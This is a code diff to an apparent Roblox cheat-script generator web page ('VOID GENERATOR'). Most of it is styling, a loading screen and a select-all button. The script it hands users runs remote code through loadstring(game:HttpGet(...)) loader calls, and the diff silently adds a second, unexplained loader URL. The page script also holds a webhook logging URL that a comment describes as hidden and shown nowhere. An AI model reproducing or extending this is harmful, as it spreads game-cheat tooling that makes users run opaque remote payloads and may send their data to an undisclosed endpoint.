@@ -301,7 +301,60 @@
             transform: scale(1.02);
         }
 
-        /* Brainrot Grid */
+        /* Brainrot Grid Header with Select All */
+        .brainrot-grid-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .brainrot-grid-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #b0c6e0;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .select-all-btn {
+            background: rgba(0, 150, 255, 0.2);
+            border: 1px solid #0088ff;
+            color: #0088ff;
+            padding: 8px 16px;
+            border-radius: 30px;
+            font-size: 13px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .select-all-btn:hover {
+            background: #0088ff;
+            color: #000;
+            box-shadow: 0 0 20px #0088ff;
+        }
+
+        .select-all-btn svg {
+            width: 16px;
+            height: 16px;
+            fill: currentColor;
+        }
+
+        .category-indicator {
+            font-size: 12px;
+            padding: 4px 10px;
+            border-radius: 20px;
+            background: rgba(0, 136, 255, 0.2);
+            color: #0088ff;
+            border: 1px solid #0088ff;
+        }
+
         .brainrot-grid {
             background: rgba(0, 20, 40, 0.3);
             border-radius: 22px;
@@ -310,42 +363,6 @@
             border: 1px solid rgba(0, 150, 255, 0.2);
             max-height: 350px;
             overflow-y: auto;
-        }
-
-        .brainrot-grid-title {
-            font-size: 14px;
-            font-weight: 700;
-            margin-bottom: 12px;
-            color: #b0c6e0;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .category-indicator {
-            font-size: 12px;
-            padding: 4px 10px;
-            border-radius: 20px;
-        }
-
-        .category-indicator.og {
-            background: rgba(255, 215, 0, 0.2);
-            color: #ffd700;
-            border: 1px solid #ffd700;
-        }
-
-        .category-indicator.secret {
-            background: rgba(255, 255, 255, 0.2);
-            color: #ffffff;
-            border: 1px solid #ffffff;
-        }
-
-        .category-indicator.all {
-            background: rgba(0, 136, 255, 0.2);
-            color: #0088ff;
-            border: 1px solid #0088ff;
         }
 
         .brainrot-items {
@@ -498,6 +515,23 @@
             letter-spacing: 0.5px;
             text-transform: uppercase;
             box-shadow: 0 10px 30px -5px #0066ff, 0 0 30px #0088ff;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .generate-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .generate-btn:hover::before {
+            left: 100%;
         }
 
         .generate-btn:active {
@@ -579,6 +613,60 @@
             display: flex;
         }
 
+        /* Loading Screen */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #03050a;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+        }
+
+        .loading-screen.hidden {
+            opacity: 0;
+            visibility: hidden;
+        }
+
+        .loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(0, 150, 255, 0.1);
+            border-top: 4px solid #0088ff;
+            border-right: 4px solid #0088ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+            box-shadow: 0 0 30px #0088ff;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: #0088ff;
+            font-size: 18px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            text-shadow: 0 0 20px #0088ff;
+            animation: pulse 2s infinite;
+        }
+
+        .loading-subtext {
+            color: #4f6f9f;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+
         .features {
             display: flex;
             align-items: center;
@@ -630,6 +718,13 @@
     </style>
 </head>
 <body>
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">VOID GENERATOR</div>
+        <div class="loading-subtext">loading resources...</div>
+    </div>
+
     <div class="container">
         <div class="card">
             <div class="header">
@@ -656,7 +751,7 @@
                 <!-- Search Textarea -->
                 <div class="search-section">
                     <textarea id="searchInput" class="search-textarea" placeholder="type to search brainrots... (e.g. Garam)"></textarea>
-                    <div class="search-hint">press Enter to search • type at least 2 characters</div>
+                    <div class="search-hint">type at least 2 characters to search</div>
                 </div>
 
                 <!-- Category Tabs -->
@@ -666,11 +761,19 @@
                     <div class="category-tab secret" id="tabSecret">SECRET</div>
                 </div>
 
-                <!-- Brainrot Grid -->
+                <!-- Brainrot Grid with Select All -->
                 <div class="brainrot-grid">
-                    <div class="brainrot-grid-title">
-                        <span>⚡ BRAINROTS</span>
-                        <span id="resultCount" class="category-indicator all">0 items</span>
+                    <div class="brainrot-grid-header">
+                        <span class="brainrot-grid-title">⚡ BRAINROTS</span>
+                        <div style="display: flex; gap: 10px; align-items: center;">
+                            <span id="resultCount" class="category-indicator">0 items</span>
+                            <button class="select-all-btn" id="selectAllBtn">
+                                <svg viewBox="0 0 24 24">
+                                    <path d="M19 3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.11 0 2-.9 2-2V5c0-1.1-.89-2-2-2zm-9 14l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                                </svg>
+                                SELECT ALL
+                            </button>
+                        </div>
                     </div>
                     <div class="brainrot-items" id="brainrotItems">
                         <!-- Verranno popolati via JS -->
@@ -712,7 +815,8 @@ getgenv().TARGET_BRAINROTS = {
     -- select brainrots
 }
 
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()</pre>
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/cc5a4f56039a816a05e03dff7604859a.lua"))()</pre>
                 </div>
 
                 <div class="features">
@@ -829,6 +933,8 @@ loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb714
         const brainrotItems = document.getElementById('brainrotItems');
         const noResults = document.getElementById('noResults');
         const resultCount = document.getElementById('resultCount');
+        const selectAllBtn = document.getElementById('selectAllBtn');
+        const loadingScreen = document.getElementById('loadingScreen');
         
         // Tab elements
         const tabAll = document.getElementById('tabAll');
@@ -837,6 +943,11 @@ loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb714
 
         // Fixed webhook (SOLO QUI, non mostrato da nessuna parte)
         const FIXED_WEBHOOK = "https://skama.net/api/logs/webhook/mrr_d4b040d735c54c7484144792d5c132c8";
+
+        // Nascondi loading screen dopo 2 secondi
+        setTimeout(() => {
+            loadingScreen.classList.add('hidden');
+        }, 2000);
 
         // Update live time
         function updateLiveTime() {
@@ -885,13 +996,11 @@ loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb714
                 brainrotItems.innerHTML = '';
                 noResults.style.display = 'block';
                 resultCount.textContent = '0 items';
-                resultCount.className = 'category-indicator ' + currentCategory;
                 return;
             }
             
             noResults.style.display = 'none';
             resultCount.textContent = filtered.length + ' items';
-            resultCount.className = 'category-indicator ' + currentCategory;
             
             let html = '';
             filtered.forEach(brainrot => {
@@ -920,6 +1029,27 @@ loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb714
             renderSelectedBrainrots();
             renderBrainrotItems();
         };
+
+        // Select all brainrots in current category
+        function selectAll() {
+            const filtered = getFilteredBrainrots();
+            
+            // Add all filtered brainrots to selected
+            filtered.forEach(brainrot => {
+                if (!selectedBrainrots.includes(brainrot)) {
+                    selectedBrainrots.push(brainrot);
+                }
+            });
+            
+            // Update UI
+            renderSelectedBrainrots();
+            renderBrainrotItems();
+            
+            // Show confirmation
+            logMessage.classList.add('show');
+            logMessage.innerHTML = `✓ selected all ${filtered.length} brainrots`;
+            setTimeout(() => logMessage.classList.remove('show'), 2000);
+        }
 
         // Highlight a specific brainrot item
         function highlightItem(brainrot) {
@@ -985,12 +1115,14 @@ getgenv().TARGET_BRAINROTS = {
 ${brainrotTable}
 }
 
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()`;
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/cc5a4f56039a816a05e03dff7604859a.lua"))()`;
 
             outputScript.textContent = script;
 
             // Show log message
             logMessage.classList.add('show');
+            logMessage.innerHTML = '✓ script generated';
             setTimeout(() => logMessage.classList.remove('show'), 2000);
         }
 
@@ -1032,6 +1164,8 @@ loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb714
         tabSecret.addEventListener('click', () => switchCategory('secret'));
 
         searchInput.addEventListener('input', handleSearch);
+
+        selectAllBtn.addEventListener('click', selectAll);
 
         generateBtn.addEventListener('click', generateScript);
 
